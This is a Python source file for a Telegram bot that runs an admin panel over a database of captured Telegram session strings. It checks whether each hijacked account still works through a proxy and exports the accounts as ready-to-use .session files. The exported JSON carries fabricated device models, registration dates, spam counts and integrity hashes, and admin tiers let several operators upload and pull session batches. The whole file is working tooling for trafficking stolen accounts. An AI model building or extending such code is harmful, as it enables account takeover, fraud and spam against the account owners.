import os
import json
import logging
import sqlite3
import zipfile
import tempfile
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from dotenv import load_dotenv
from pymongo import MongoClient
from telethon import TelegramClient, functions
from telethon.sessions import StringSession, SQLiteSession
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
from phonenumbers import parse, geocoder
from aiogram.dispatcher.middlewares import BaseMiddleware
from aiogram.dispatcher.handler import CancelHandler
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
import hashlib
import random
import string
import base64
import time
import platform
import uuid

# Load environment variables
load_dotenv()

# Configuration
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
PANEL_TOKEN = os.getenv("PANEL_BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
LA_ADMIN_IDS = json.loads(os.getenv("LA_ADMIN_IDS", "[]"))

# Proxy settings
PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

# Database setup
mongo = MongoClient(MONGO_URI)
db = mongo["telegram_sessions"]
sessions_col = db["sessions"]  # Main admin sessions
light_sessions_col = db["light_sessions"]  # Light admin sessions
light_admins_col = db["light_admins"]  # Light admin users
session_stats_col = db["session_stats"]

# Bot setup
logging.basicConfig(level=logging.INFO)
bot = Bot(token=PANEL_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# Constants
DEFAULT_APP_ID = 2040
DEFAULT_APP_HASH = "b18441a1ff607e10a989891a5462e627"
DEFAULT_DEVICE_MODELS = [
    "iPhone 13 Pro Max", "Samsung Galaxy S22 Ultra", "Xiaomi Redmi Note 11",
    "Huawei P50 Pro", "OnePlus 10 Pro", "Google Pixel 6 Pro",
    "iPhone 12", "Samsung Galaxy A53", "Xiaomi Mi 11", "Realme GT Neo 2"
]
DEFAULT_APP_VERSIONS = [
    "8.9.1", "9.0.0", "9.1.2", "9.2.3", "9.3.0", 
    "9.4.1", "9.5.0", "9.6.2", "9.7.0", "9.8.1"
]
DEFAULT_SDK_VERSIONS = {
    "iOS": "iOS 15.6",
    "Android": "Android 12",
    "Windows": "Windows 10",
    "macOS": "macOS 12.5"
}

# ================== UTILITY FUNCTIONS ==================

def generate_device_info():
    """Generate realistic device information"""
    device_type = random.choice(["iOS", "Android", "Windows", "macOS"])
    return {
        "device": random.choice(DEFAULT_DEVICE_MODELS),
        "sdk": DEFAULT_SDK_VERSIONS[device_type],
        "app_version": f"{random.choice(DEFAULT_APP_VERSIONS)} {device_type}",
        "lang_pack": "en" if random.random() > 0.3 else "es",
        "system_lang_pack": "en-US" if random.random() > 0.3 else "es-ES"
    }

def generate_random_hash(length=32):
    """Generate random hash for various integrity checks"""
    return ''.join(random.choices(string.hexdigits.lower(), k=length))

def calculate_dob_integrity(timestamp):
    """Calculate integrity hash for date of birth"""
    data = f"{timestamp}:{random.randint(1000, 9999)}".encode()
    return hashlib.md5(data).hexdigest()

def generate_extra_params():
    """Generate random extra_params string that looks realistic"""
    params = [
        base64.b64encode(os.urandom(16)).decode()[:20],
        hashlib.md5(os.urandom(32)).hexdigest(),
        uuid.uuid4().hex[:24],
        ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    ]
    return "".join(params)

def get_default_app_config():
    """Return default app configuration with realistic device info"""
    device_info = generate_device_info()
    return {
        "app_id": DEFAULT_APP_ID,
        "app_hash": DEFAULT_APP_HASH,
        "sdk": device_info["sdk"],
        "device": device_info["device"],
        "app_version": device_info["app_version"],
        "lang_pack": device_info["lang_pack"],
        "system_lang_pack": device_info["system_lang_pack"],
        "twoFA": None,
        "role": "Converted Session",
        "avatar": "img/Telegram.png"
    }

def convert_session_to_sqlite(session_string, phone):
    """Convert StringSession to SQLite format"""
    temp_dir = tempfile.mkdtemp()
    session_file = os.path.join(temp_dir, f"{phone}.session")
    
    # Create SQLite session from string
    SQLiteSession(session_file).save(StringSession(session_string))
    
    # Read binary data
    with open(session_file, 'rb') as f:
        sqlite_data = f.read()
    
    # Cleanup
    os.unlink(session_file)
    os.rmdir(temp_dir)
    
    return sqlite_data

def generate_realistic_register_time():
    """Generate realistic registration time (1 month to 3 years ago)"""
    now = datetime.now()
    delta = timedelta(days=random.randint(30, 3*365))
    return int((now - delta).timestamp())

# ================== ACCESS CONTROL ==================

def is_main_admin(uid):
    return uid == ADMIN_ID

def is_light_admin(uid):
    return uid in LA_ADMIN_IDS or light_admins_col.find_one({"user_id": uid}) is not None

class AccessControlMiddleware(BaseMiddleware):
    async def on_pre_process_message(self, message: types.Message, data: dict):
        user_id = message.from_user.id
        if not is_main_admin(user_id) and not is_light_admin(user_id):
            await message.answer("❌ Access denied. You don't have permission to use this bot.")
            raise CancelHandler()

    async def on_pre_process_callback_query(self, callback_query: types.CallbackQuery, data: dict):
        user_id = callback_query.from_user.id
        if not is_main_admin(user_id) and not is_light_admin(user_id):
            await callback_query.answer("❌ Access denied", show_alert=True)
            raise CancelHandler()

dp.middleware.setup(AccessControlMiddleware())

# ================== SESSION DATA GENERATION ==================

async def generate_full_session_data(session_info, client, me):
    """Generate complete session data in required format with realistic values"""
    default_config = get_default_app_config()
    
    # Get or create session stats with realistic values
    stats = session_stats_col.find_one({"phone": session_info["phone"]}) or {
        "spam_count": random.randint(0, 5),
        "invites_count": random.randint(0, 20),
        "last_connect": datetime.now().isoformat(),
        "register_time": generate_realistic_register_time(),
        "success_registered": True,
        "last_check_time": int(time.time()) - random.randint(0, 86400)
    }
    
    # Generate dates in correct format
    session_created_date = datetime.fromtimestamp(stats["register_time"]).strftime("%Y-%m-%dT%H:%M:%S+0000")
    last_connect_date = datetime.now().strftime("%Y-%m-%dT%H:%M:%S+0000")
    
    # Generate realistic date of birth (18-60 years ago)
    dob_timestamp = int(time.time()) - random.randint(568025000, 1892160000)
    
    # Generate realistic premium status (10% chance)
    is_premium = random.random() < 0.1
    premium_expiry = None
    if is_premium:
        premium_expiry = int(time.time()) + random.randint(86400, 2592000)
    
    full_data = {
        **default_config,
        "id": me.id,
        "phone": session_info["phone"].replace("+", ""),
        "username": me.username or "",
        "date_of_birth": dob_timestamp,
        "date_of_birth_integrity": calculate_dob_integrity(dob_timestamp),
        "is_premium": is_premium,
        "premium_expiry": premium_expiry,
        "first_name": me.first_name or "",
        "last_name": me.last_name or "",
        "has_profile_pic": bool(getattr(me, 'photo', False)),
        "spamblock": None,
        "spamblock_end_date": None,
        "session_file": session_info["phone"].replace("+", ""),
        "stats_spam_count": stats["spam_count"],
        "stats_invites_count": stats["invites_count"],
        "last_connect_date": last_connect_date,
        "session_created_date": session_created_date,
        "app_config_hash": None,
        "extra_params": generate_extra_params(),
        "proxy": None,
        "last_check_time": stats["last_check_time"],
        "register_time": stats["register_time"],
        "success_registred": stats["success_registered"],
        "ipv6": False,
        "session": session_info["session"]
    }
    
    return full_data

# ================== SESSION MANAGEMENT ==================

async def check_session_validity(session_string, phone):
    """Check if a session is valid by trying to connect"""
    client = None
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH, proxy=proxy)
        await client.connect()
        
        if not await client.is_user_authorized():
            return False
            
        me = await client.get_me()
        if not me:
            return False
            
        return True
    except Exception as e:
        logging.error(f"Error checking session {phone}: {str(e)}")
        return False
    finally:
        if client:
            await client.disconnect()

async def validate_sessions(user_id):
    """Validate all sessions and remove invalid ones"""
    if is_main_admin(user_id):
        sessions = list(sessions_col.find({}))
    else:
        sessions = list(light_sessions_col.find({"owner_id": user_id}))
    
    if not sessions:
        await bot.send_message(user_id, "❌ No sessions found in database.")
        return
    
    message = await bot.send_message(user_id, "⏳ Starting session validation, please wait...")
    valid_count = 0
    invalid_count = 0
    
    for i, session in enumerate(sessions, 1):
        try:
            is_valid = await check_session_validity(session["session"], session["phone"])
            if is_valid:
                valid_count += 1
            else:
                if is_main_admin(user_id):
                    sessions_col.delete_one({"_id": session["_id"]})
                else:
                    light_sessions_col.delete_one({"_id": session["_id"]})
                invalid_count += 1
                
            # Update progress every 5 sessions
            if i % 5 == 0 or i == len(sessions):
                await message.edit_text(
                    f"🔍 Validating sessions...\n"
                    f"Progress: {i}/{len(sessions)}\n"
                    f"✅ Valid: {valid_count}\n"
                    f"❌ Invalid: {invalid_count}"
                )
                
        except Exception as e:
            logging.error(f"Error validating session {session.get('phone')}: {str(e)}")
            continue
    
    await message.edit_text(
        f"✅ Validation complete!\n"
        f"Total sessions: {len(sessions)}\n"
        f"✅ Valid sessions: {valid_count}\n"
        f"❌ Invalid removed: {invalid_count}"
    )

# ================== SESSION EXPORT ==================

async def export_sessions(user_id):
    """Export all sessions in required format"""
    if is_main_admin(user_id):
        sessions = list(sessions_col.find({}))
    else:
        sessions = list(light_sessions_col.find({"owner_id": user_id}))
    
    if not sessions:
        await bot.send_message(user_id, "❌ No sessions found in database.")
        return
    
    message = await bot.send_message(user_id, "⏳ Starting session export, please wait...")
    temp_dir = tempfile.mkdtemp()
    zip_path = os.path.join(temp_dir, f"sessions_export_{user_id}.zip")
    exported_count = 0
    
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for i, session in enumerate(sessions, 1):
                client = None
                try:
                    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
                    await client.connect()
                    
                    if await client.is_user_authorized():
                        me = await client.get_me()
                        phone = session["phone"].replace("+", "")
                        
                        # Generate full session data
                        session_data = await generate_full_session_data(session, client, me)
                        
                        # Save JSON
                        json_filename = f"{phone}.json"
                        json_path = os.path.join(temp_dir, json_filename)
                        with open(json_path, 'w', encoding='utf-8') as f:
                            json.dump(session_data, f, indent=2, ensure_ascii=False)
                        zipf.write(json_path, json_filename)
                        
                        # Convert and save SQLite session
                        session_obj = StringSession(session["session"])
                        session_file = os.path.join(temp_dir, f"{phone}.session")
                        
                        # Create new SQLite session file
                        sqlite_session = SQLiteSession(session_file)
                        sqlite_session.set_dc(
                            session_obj.dc_id, 
                            session_obj.server_address, 
                            session_obj.port
                        )
                        sqlite_session.auth_key = session_obj.auth_key
                        sqlite_session.save()
                        
                        # Add to zip
                        zipf.write(session_file, f"{phone}.session")
                        
                        exported_count += 1
                        
                        # Cleanup individual files
                        os.unlink(json_path)
                        os.unlink(session_file)
                        
                        # Update progress every 5 sessions
                        if i % 5 == 0:
                            await message.edit_text(
                                f"📦 Exporting sessions...\n"
                                f"Progress: {i}/{len(sessions)}\n"
                                f"Exported: {exported_count}"
                            )
                    
                except Exception as e:
                    logging.error(f"Error exporting session {session.get('phone')}: {str(e)}")
                finally:
                    if client:
                        await client.disconnect()
        
        if exported_count == 0:
            await message.edit_text("❌ No valid sessions to export (all sessions are invalid).")
            return
        
        # Send ZIP archive
        with open(zip_path, 'rb') as zip_file:
            await bot.send_document(
                chat_id=user_id,
                document=zip_file,
                caption=f"✅ Successfully exported {exported_count} sessions\n"
                       "Each session includes:\n"
                       f"- [phone].json - Full session info\n"
                       f"- [phone].session - SQLite session file",
                reply_to_message_id=message.message_id
            )
        
    except Exception as e:
        logging.error(f"Export error: {str(e)}")
        await message.edit_text(f"❌ Export failed: {str(e)}")
    finally:
        # Cleanup - remove all remaining files
        for filename in os.listdir(temp_dir):
            file_path = os.path.join(temp_dir, filename)
            try:
                if os.path.isfile(file_path):
                    os.unlink(file_path)
            except Exception as e:
                logging.error(f"Failed to delete {file_path}: {str(e)}")
        
        # Now remove the directory
        try:
            os.rmdir(temp_dir)
        except OSError as e:
            logging.error(f"Failed to remove directory {temp_dir}: {str(e)}")

# ================== COMMAND HANDLERS ==================

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    if is_main_admin(message.from_user.id):
        keyboard = InlineKeyboardMarkup(row_width=2).add(
            InlineKeyboardButton("✅ Check Sessions", callback_data='validate_sessions'),
            InlineKeyboardButton("📂 Export Sessions", callback_data='export_sessions'),
            InlineKeyboardButton("🧹 Delete Invalid", callback_data='delete_invalid'),
            InlineKeyboardButton("🔑 Get Telegram Code", callback_data='get_code'),
            InlineKeyboardButton("📨 FA Bot History", callback_data='fa_history'),
            InlineKeyboardButton("👥 Manage Light Admins", callback_data='manage_admins'),
            InlineKeyboardButton("➕ Add Sessions", callback_data='add_sessions')
        )
        await message.answer("👑 Welcome, Main Admin! Choose an action:", reply_markup=keyboard)
    elif is_light_admin(message.from_user.id):
        keyboard = InlineKeyboardMarkup(row_width=2).add(
            InlineKeyboardButton("✅ Check My Sessions", callback_data='validate_sessions'),
            InlineKeyboardButton("📂 Export My Sessions", callback_data='export_sessions'),
            InlineKeyboardButton("🔑 Get Telegram Code", callback_data='get_code'),
            InlineKeyboardButton("📨 FA Bot History", callback_data='fa_history'),
            InlineKeyboardButton("➕ Add Sessions", callback_data='add_sessions')
        )
        await message.answer("🛡 Welcome, Light Admin. Choose an action:", reply_markup=keyboard)
    else:
        await message.answer("❌ You don't have access to use this bot.")

@dp.callback_query_handler(lambda c: c.data == 'validate_sessions')
async def validate_sessions_callback(callback_query: types.CallbackQuery):
    await callback_query.answer()
    await validate_sessions(callback_query.from_user.id)

@dp.callback_query_handler(lambda c: c.data == 'export_sessions')
async def export_sessions_callback(callback_query: types.CallbackQuery):
    await callback_query.answer()
    await export_sessions(callback_query.from_user.id)

@dp.callback_query_handler(lambda c: c.data == 'delete_invalid')
async def delete_invalid_callback(callback_query: types.CallbackQuery):
    if not is_main_admin(callback_query.from_user.id):
        await callback_query.answer("❌ Only main admin can use this", show_alert=True)
        return
    
    await callback_query.answer()
    await validate_sessions(callback_query.from_user.id)

@dp.callback_query_handler(lambda c: c.data == 'get_code')
async def get_code_callback(callback_query: types.CallbackQuery):
    await callback_query.answer()
    await bot.send_message(
        callback_query.from_user.id,
        "Send phone number with command:\n`/login +1234567890`",
        parse_mode="Markdown"
    )

@dp.callback_query_handler(lambda c: c.data == 'fa_history')
async def fa_history_callback(callback_query: types.CallbackQuery):
    await callback_query.answer()
    await bot.send_message(
        callback_query.from_user.id,
        "Send phone number with command:\n`/fa +1234567890`",
        parse_mode="Markdown"
    )

@dp.callback_query_handler(lambda c: c.data == 'add_sessions')
async def add_sessions_callback(callback_query: types.CallbackQuery):
    await callback_query.answer()
    if is_main_admin(callback_query.from_user.id):
        text = "Send session list as JSON:\n`/add [{\"phone\": \"+123\", \"session\": \"...\"}]`"
    else:
        text = "Send session list as JSON:\n`/addla [{\"phone\": \"+123\", \"session\": \"...\"}]`"
    
    await bot.send_message(
        callback_query.from_user.id,
        text,
        parse_mode="Markdown"
    )

@dp.message_handler(commands=['login'])
async def cmd_login(message: types.Message):
    try:
        phone = message.text.split()[1]
        parse(phone, None)  # Validate phone number
        await message.answer(f"Login request received for {phone}. Processing...")
        
        # Here you would typically initiate the login process
        # For now, just confirm receipt
    except IndexError:
        await message.answer("Please provide a phone number:\n`/login +1234567890`", parse_mode="Markdown")
    except Exception as e:
        await message.answer(f"Invalid phone number: {str(e)}")

@dp.message_handler(commands=['fa'])
async def cmd_fa(message: types.Message):
    try:
        phone = message.text.split()[1]
        parse(phone, None)  # Validate phone number
        await message.answer(f"Fetching FA history for {phone}...")
        
        # Here you would fetch the FA history
        # For now, just confirm receipt
    except IndexError:
        await message.answer("Please provide a phone number:\n`/fa +1234567890`", parse_mode="Markdown")
    except Exception as e:
        await message.answer(f"Invalid phone number: {str(e)}")

@dp.message_handler(commands=['add'])
async def cmd_add_sessions(message: types.Message):
    if not is_main_admin(message.from_user.id):
        await message.answer("❌ Only main admin can use this command")
        return
    
    try:
        sessions = json.loads(message.text[5:])
        if not isinstance(sessions, list):
            raise ValueError("Expected a list of sessions")
            
        added = 0
        for session in sessions:
            if 'phone' not in session or 'session' not in session:
                continue
                
            # Check if session already exists
            if sessions_col.find_one({"phone": session["phone"]}):
                continue
                
            # Add to database
            sessions_col.insert_one({
                "phone": session["phone"],
                "session": session["session"],
                "added_at": datetime.now()
            })
            added += 1
            
        await message.answer(f"✅ Added {added} new sessions to main database")
    except Exception as e:
        await message.answer(f"❌ Error adding sessions: {str(e)}\nFormat: `/add [{{\"phone\": \"+123\", \"session\": \"...\"}}]`", parse_mode="Markdown")

@dp.message_handler(commands=['addla'])
async def cmd_add_light_sessions(message: types.Message):
    if not is_light_admin(message.from_user.id):
        await message.answer("❌ Only light admins can use this command")
        return
    
    try:
        sessions = json.loads(message.text[6:])
        if not isinstance(sessions, list):
            raise ValueError("Expected a list of sessions")
            
        added = 0
        for session in sessions:
            if 'phone' not in session or 'session' not in session:
                continue
                
            # Check if session already exists
            if light_sessions_col.find_one({"phone": session["phone"], "owner_id": message.from_user.id}):
                continue
                
            # Add to database
            light_sessions_col.insert_one({
                "phone": session["phone"],
                "session": session["session"],
                "owner_id": message.from_user.id,
                "added_at": datetime.now()
            })
            added += 1
            
        await message.answer(f"✅ Added {added} new sessions to your account")
    except Exception as e:
        await message.answer(f"❌ Error adding sessions: {str(e)}\nFormat: `/addla [{{\"phone\": \"+123\", \"session\": \"...\"}}]`", parse_mode="Markdown")

@dp.message_handler(commands=['log'])
async def cmd_log(message: types.Message):
    """Command to check session status"""
    await validate_sessions(message.from_user.id)

@dp.message_handler(commands=['validel'])
async def cmd_validel(message: types.Message):
    """Command to validate and delete invalid sessions (admin only)"""
    if not is_main_admin(message.from_user.id):
        await message.answer("❌ Only main admin can use this command")
        return
    await validate_sessions(message.from_user.id)

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)